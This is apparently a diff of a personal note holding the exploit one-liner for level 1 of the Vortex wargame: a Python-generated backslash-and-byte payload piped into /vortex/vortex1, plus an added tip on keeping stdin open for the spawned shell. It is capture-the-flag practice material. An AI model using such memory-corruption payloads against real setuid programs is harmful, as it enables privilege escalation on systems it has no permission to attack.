@@ -1,3 +1,8 @@
 #stdbuf -o267 python -c "print ('\\\'*261) + '\xca' + '\\\'*4  + 's' + 'vim\n' * 1" | stdbuf -i267 /vortex/vortex1
 
 stdbuf -o267 python -c "print ('\\\'*261) + '\xca' + '\\\'*4  + 's' + 'vim\n' * 1" | /vortex/vortex1
+
+
+Could have been:
+
+(./exploit; cat)|./binary
